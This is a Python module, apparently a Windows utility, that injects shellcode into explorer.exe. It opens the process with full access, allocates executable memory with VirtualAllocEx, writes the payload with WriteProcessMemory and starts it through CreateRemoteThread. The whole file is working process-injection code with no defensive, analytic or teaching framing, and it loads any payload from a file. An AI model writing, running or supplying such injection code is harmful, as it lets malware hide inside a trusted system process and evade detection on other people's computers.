# utils/winapi/inject_shellcode.py

import ctypes
import os

# Define necessary constants and structures
TH32CS_SNAPPROCESS = 0x00000002
PROCESS_ALL_ACCESS = 0x1F0FFF

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_uint32),
        ("cntUsage", ctypes.c_uint32),
        ("th32ProcessID", ctypes.c_uint32),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_uint32),
        ("cntThreads", ctypes.c_uint32),
        ("th32ParentProcessID", ctypes.c_uint32),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_uint32),
        ("szExeFile", ctypes.c_char * 260)
    ]

def get_process_by_name(process_name):
    """Get the handle of a process by its name."""
    hSnapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
    
    process_handle = None

    if ctypes.windll.kernel32.Process32First(hSnapshot, ctypes.byref(entry)):
        while ctypes.windll.kernel32.Process32Next(hSnapshot, ctypes.byref(entry)):
            if entry.szExeFile.decode('utf-8') == process_name:
                process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, entry.th32ProcessID)
                break

    ctypes.windll.kernel32.CloseHandle(hSnapshot)

    if not process_handle:
        raise ProcessLookupError(f"Process '{process_name}' not found.")

    return process_handle

def inject_shellcode(target_process, shellcode):
    """Inject and execute shellcode in the target process."""
    shellcode_size = len(shellcode)

    shellcode_buffer = ctypes.windll.kernel32.VirtualAllocEx(
        target_process,
        None,
        shellcode_size,
        0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
        0x40              # PAGE_EXECUTE_READWRITE
    )

    if not shellcode_buffer:
        raise MemoryError("Failed to allocate memory in target process.")

    written = ctypes.c_size_t(0)
    if not ctypes.windll.kernel32.WriteProcessMemory(
        target_process,
        shellcode_buffer,
        shellcode,
        shellcode_size,
        ctypes.byref(written)
    ):
        raise RuntimeError("Failed to write shellcode to target process memory.")

    thread_id = ctypes.c_ulong(0)
    if not ctypes.windll.kernel32.CreateRemoteThread(
        target_process,
        None,
        0,
        shellcode_buffer,
        None,
        0,
        ctypes.byref(thread_id)
    ):
        raise RuntimeError("Failed to create remote thread in target process.")

def load_shellcode_into_explorer(file_path):
    """Loads and executes shellcode from the given file path in explorer.exe."""
    try:
        if not os.path.isfile(file_path):
            raise FileNotFoundError(f"The file '{file_path}' does not exist.")

        with open(file_path, 'rb') as f:
            shellcode = f.read()

        explorer_handle = get_process_by_name('explorer.exe')
        inject_shellcode(explorer_handle, shellcode)

        ctypes.windll.kernel32.CloseHandle(explorer_handle)

        return "Shellcode injected and executed successfully in explorer.exe."
    except Exception as e:
        return f"Error injecting shellcode: {str(e)}"
